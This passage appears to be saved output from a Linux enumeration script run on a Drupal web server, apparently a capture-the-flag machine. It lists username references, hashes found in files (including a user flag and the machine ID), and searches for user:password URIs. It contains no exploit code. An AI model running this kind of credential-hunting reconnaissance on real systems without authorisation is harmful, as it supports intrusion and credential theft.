+/var/www/html/modules/blog/blog.module:      $links['blog_usernames_blog'] = array(
+/var/www/html/modules/comment/comment.admin.inc:      'author' => theme('username', array('account' => $comment)),
+/var/www/html/modules/comment/comment.module:  $variables['author']    = theme('username', array('account' => $comment));
+/var/www/html/modules/dblog/dblog.admin.inc:        theme('username', array('account' => $dblog)),
+/var/www/html/modules/locale/locale.test:    $username = $this->randomName(10);
+/var/www/html/modules/node/node.admin.inc:      'author' => theme('username', array('account' => $node)),
+/var/www/html/modules/node/node.module:      'user' => theme('username', array('account' => $node)),
+/var/www/html/modules/node/node.module:    form_set_error('name', t('The username %name does not exist.', array('%name' => $node->name)));
+/var/www/html/modules/node/node.module:  $output .= theme('username', array('account' => user_load($node->uid)));
+/var/www/html/modules/node/node.module:  $variables['name']      = theme('username', array('account' => $node));
+/var/www/html/modules/poll/poll.pages.inc:      $vote->name ? theme('username', array('account' => $vote)) : check_plain($vote->hostname),
+/var/www/html/modules/profile/profile.module:  $variables['name'] = theme('username', array('account' => $variables['account']));
+/var/www/html/modules/rdf/rdf.module:  $username_meta = array(
+/var/www/html/modules/rdf/rdf.test:      ':username' => $username,
+/var/www/html/modules/rdf/rdf.test:    $this->assertTrue(!empty($user_username), 'foaf:name set on username.');
+/var/www/html/modules/rdf/rdf.test:    $username = $user2->name;
+/var/www/html/modules/search/search.api.php:      'user' => theme('username', array('account' => $node)),
+/var/www/html/modules/simpletest/drupal_web_test_case.php:      $this->httpauth_credentials = $username . ':' . $password;
+/var/www/html/modules/simpletest/drupal_web_test_case.php:    $username = variable_get('simpletest_httpauth_username', NULL);
+/var/www/html/modules/simpletest/drupal_web_test_case.php:    // HTTP auth settings (<username>:<password>) for the simpletest browser
+/var/www/html/modules/simpletest/drupal_web_test_case.php:   * HTTP authentication credentials (<username>:<password>).
+/var/www/html/modules/simpletest/simpletest.pages.inc:  $form['httpauth']['simpletest_httpauth_username'] = array(
+/var/www/html/modules/simpletest/simpletest.pages.inc:  $username = variable_get('simpletest_httpauth_username');
+/var/www/html/modules/simpletest/tests/common.test:    $auth = str_replace('://', '://' . $username . ':' . $password . '@', $url);
+/var/www/html/modules/simpletest/tests/common.test:    $username = $this->randomName();
+/var/www/html/modules/simpletest/tests/database_test.module:      'username' => check_plain($account->name),
+/var/www/html/modules/simpletest/tests/database_test.module:    'username' => array('data' => t('Username'), 'field' => 'u.name'),
+/var/www/html/modules/simpletest/tests/filetransfer.test:  function __construct($jail, $username, $password, $hostname = 'localhost', $port = 9999) {
+/var/www/html/modules/simpletest/tests/filetransfer.test:  protected $username = 'drupal';
+/var/www/html/modules/simpletest/tests/filetransfer.test:  protected $username = NULL;
+/var/www/html/modules/simpletest/tests/system_test.module:    $form['system_test_username'] = array(
+/var/www/html/modules/simpletest/tests/system_test.module:  $output = t('Username is @username.', array('@username' => $user));
+/var/www/html/modules/statistics/statistics.admin.inc:      theme('username', array('account' => $access))
+/var/www/html/modules/statistics/statistics.admin.inc:      theme('username', array('account' => $log)),
+/var/www/html/modules/statistics/statistics.pages.inc:        theme('username', array('account' => $log)),
+/var/www/html/modules/system/system.api.php:    '%username' => format_username($account),
+/var/www/html/modules/toolbar/toolbar.module:        'title' => t('Hello <strong>@username</strong>', array('@username' => format_username($user))),
+/var/www/html/modules/tracker/tracker.pages.inc:        'author' => array('data' => theme('username', array('account' => $node))),
+/var/www/html/modules/trigger/trigger.test:        '@username' => $account->name,
+/var/www/html/modules/update/tests/update_test.module:    $form['udpate_test_username'] = array(
+/var/www/html/modules/user/user.admin.inc:      'username' => theme('username', array('account' => $account)),
+/var/www/html/modules/user/user.admin.inc:    'username' => array('data' => t('Username'), 'field' => 'u.name'),
+/var/www/html/modules/user/user.install:    '!username' => '[user:name]',
+/var/www/html/modules/user/user.js:  var username = (usernameBox.length > 0) ? usernameBox.val() : translate.username;
+/var/www/html/modules/user/user.js:  var usernameBox = $('input.username');
+/var/www/html/modules/user/user.module:      $items[] = theme('username', array('account' => $user));
+/var/www/html/modules/user/user.module:      'sameAsUsername' => t('Make it different from your username'),
+/var/www/html/modules/user/user.module:      'username' => (isset($user->name) ? $user->name : ''),
+/var/www/html/modules/user/user.module:    'change own username' => array(
+/var/www/html/modules/user/user.module:  return is_object($account) ? format_username($account) : '';
+/var/www/html/modules/user/user.module:username: [user:name]
+/var/www/html/modules/user/user.test:      'external username one' => array(
+/var/www/html/modules/user/user.test:      'external username two' => array(
+/var/www/html/modules/user/user.test:      str_repeat('x', USERNAME_MAX_LENGTH + 1) => array('Invalid excessively long username', 'assertNotNull'),
+/var/www/html/modules/user/user.test:    $expected_authmaps['external username three'] = array('blog' => 'external username three');
+/var/www/html/modules/user/user.test:    $remove_username = 'external username one';
+/var/www/html/modules/user/user.test:    $test_cases = array( // '<username>' => array('<description>', 'assert<testName>'),
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+
+[+] Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)
+/etc/popularity-contest.conf:"1d91e9384929468894c0f2ce6edf8f4a"
+/etc/java-11-openjdk/security/blacklisted.certs:14E6D2764A4B06701C6CBC376A253775F79C782FBCB6C0EE6F99DE4BA1024ADD
+/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5 
+/etc/java-8-openjdk/security/blacklisted.certs:14E6D2764A4B06701C6CBC376A253775F79C782FBCB6C0EE6F99DE4BA1024ADD
+/etc/machine-id:a37481d05c5a4b11b197e7cc217e727f
+/var/backups/dpkg.status.0: 36de53e7c2d968f951b11c64be101b91
+/var/www/html/modules/update/tests/update_test_basetheme.1_1-sec.xml:>b966255555d9c9b86d480ca08cfaa98e<
+/var/www/html/modules/update/tests/drupal.1.xml:>b966255555d9c9b86d480ca08cfaa98e<
+/var/www/html/modules/update/tests/aaa_update_test.1_0.xml:>b966255555d9c9b86d480ca08cfaa98e<
+  There are more hashes files in the previous parent folder
+/var/www/html/modules/simpletest/tests/upgrade/drupal-6.locale.database.php:'51e92dcfe1491f4595b9df7f3b287753'
+/var/www/html/modules/simpletest/tests/upgrade/drupal-6.bare.database.php:'21232f297a57a5a743894a0e4a801fc3'
+  There are more hashes files in the previous parent folder
+/var/www/html/includes/menu.inc: 1cf698d64d1aa4b83907cf6ed55db3a7f8e92c91
+/home/daniel/user.txt:d5111d4f75370ebd01cdba5b32e202a8
+
+[+] Finding URIs with user:password@host inside key folders
+/var/www/html/includes/bootstrap.inc: *   @link http://www.faqs.org/rfcs/rfc3164.html RFC 3164: @endlink
+/var/www/html/includes/common.inc: *   @link http://tools.ietf.org/html/draft-reschke-http-status-308-07 draft for the new HTTP status codes: @endlink
+/var/www/html/modules/filter/filter.test:        '<a href="sftp://user@nonstandardport:222/dir">sftp://user@nonstandardport:222/dir</a>' => TRUE,
+/var/www/html/modules/filter/filter.test:ftp://user:pass@ftp.example.com/~home/dir1
+/var/www/html/modules/simpletest/tests/common.test:    $auth = str_replace('://', '://' . $username . ':' . $password . '@', $url);
+/var/www/html/modules/system/system.api.php: *     defined in @link http://www.faqs.org/rfcs/rfc3164.html RFC 3164: @endlink
